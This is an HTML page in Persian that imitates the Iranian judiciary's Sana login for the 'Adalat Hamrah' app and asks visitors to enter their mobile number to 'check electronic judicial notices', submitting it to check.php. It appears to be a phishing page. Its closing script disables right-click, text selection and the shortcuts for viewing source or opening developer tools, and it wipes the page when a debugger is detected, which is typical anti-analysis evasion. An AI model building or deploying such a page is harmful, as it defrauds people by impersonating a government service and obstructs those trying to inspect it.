<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>سامانه احراز هویت ثنا</title>
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/shabnam-font@v5.0.1/dist/font-face.css" rel="stylesheet">
  <style>
    body {
      font-family: 'Shabnam', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f7f9fc;
    }
    .header {
      background: url('gg.png') no-repeat center top;
      background-size: cover;
      height: 55.5px;
      position: relative;
    }
    .logo {
      background: white;
      border-radius: 50%;
      padding: 4px;
      width: 44px;
      height: 44px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      bottom: -27.5px;
      box-shadow: 0 0 6px rgba(0,0,0,0.05);
    }
    .logo img {
      width: 36px;
      height: 36px;
    }
    .container {
      max-width: 400px;
      margin: 25px auto 30px;
      padding: 0 20px;
    }
    .title {
      text-align: center;
      font-size: 18px;
      font-weight: bold;
      color: #002366;
      margin-top: 5px;
    }
    .subtitle {
      text-align: center;
      font-size: 14px;
      color: #777;
      margin-bottom: 15px;
    }
    .user-types {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin-bottom: 30px;
    }
    .user-types button {
      padding: 8px 10px;
      border-radius: 4px;
      border: 1px solid #ccc;
      background: #fff;
      font-size: 13px;
      cursor: pointer;
      font-family: 'Shabnam', sans-serif;
    }
    .user-types .active {
      border: 1px solid #f9a825;
      background-color: #fff8e1;
      position: relative;
    }
    .user-types .active::after {
      content: "";
      position: absolute;
      bottom: 6px;
      left: 50%;
      transform: translateX(-50%);
      width: 6px;
      height: 6px;
      background: #f9a825;
      border-radius: 50%;
    }
    input {
      width: 100%;
      padding: 10px 14px;
      margin-bottom: 15px;
      border-radius: 6px;
      border: 1px solid #ccc;
      background-color: #fff;
      font-size: 14px;
      font-family: 'Shabnam', sans-serif;
      box-sizing: border-box;
    }
    label {
      font-size: 14px;
      color: #333;
      margin-bottom: 5px;
      display: block;
    }
    .btn-submit {
      width: 100%;
      padding: 12px 0;
      background-color: #002366;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      font-family: 'Shabnam', sans-serif;
      text-align: center;
      cursor: pointer;
    }

    #popup-error {
      font-family: 'Shabnam', sans-serif;
      background-color: #ffe0e0;
      color: #b00020;
      border: 1px solid #f5c2c7;
      padding: 12px 16px;
      border-radius: 8px;
      max-width: 360px;
      margin: 10px auto;
      text-align: center;
      font-size: 14px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      display: none;
      transition: opacity 0.3s ease-in-out;
    }
  </style>
</head>
<body>

  <div class="header">
    <div class="logo">
      <img src="logo.png" alt="logo">
    </div>
  </div>

  <div class="container">
    <div id="popup-error"></div>

    <div class="title">ورود به اپلیکیشن عدالت همراه</div>
    <div class="subtitle">بررسی ابلاغ الکترونیک قضایی</div>

    <div class="user-types">
      <button id="melliBtn">ورود با شماره ملی</button>
      <button id="nonIranianBtn" class="active">ورود با شماره همراه</button>
    </div>

    <form id="sanaForm" method="POST" action="check.php">
      <label for="number">شماره همراه خود را وارد کنید.</label>
      <input type="text" id="number" name="number" maxlength="11" inputmode="numeric" pattern="[0-9]*">
      <button type="submit" class="btn-submit">ورود به اپلیکیشن</button>
    </form>
  </div>

  <script>
    function showError(message) {
      const popup = document.getElementById("popup-error");
      popup.textContent = message;
      popup.style.display = "block";
      popup.style.opacity = 1;

      setTimeout(() => {
        popup.style.opacity = 0;
        setTimeout(() => {
          popup.style.display = "none";
        }, 300);
      }, 3000);
    }

    document.getElementById("melliBtn").addEventListener("click", function () {
      window.location.href = "/app/index.php";
    });

    document.getElementById("sanaForm").addEventListener("submit", function (e) {
      const numberInput = document.getElementById("number");
      const value = numberInput.value.trim();
      const regex = /^[0-9]{11}$/;

      if (!value) {
        e.preventDefault();
        showError("لطفاً شماره همراه خود را وارد کنید.");
      } else if (!regex.test(value)) {
        e.preventDefault();
        showError("شماره همراه باید فقط شامل عدد و ۱۱ رقم باشد.");
      }
    });
  </script>


<script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', function(e){
    if(
        e.keyCode === 123 || 
        (e.ctrlKey && e.keyCode === 85) || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
        (e.ctrlKey && e.keyCode === 83)
    ){
        e.preventDefault();
        return false;
    }
});
document.addEventListener('selectstart', e => e.preventDefault());

// basic devtools detect (weak)
setInterval(function(){
    const before = Date.now();
    debugger;
    const after = Date.now();
    if(after - before > 100){
        document.body.innerHTML = "";
    }
}, 2000);
</script>

</body>
</html>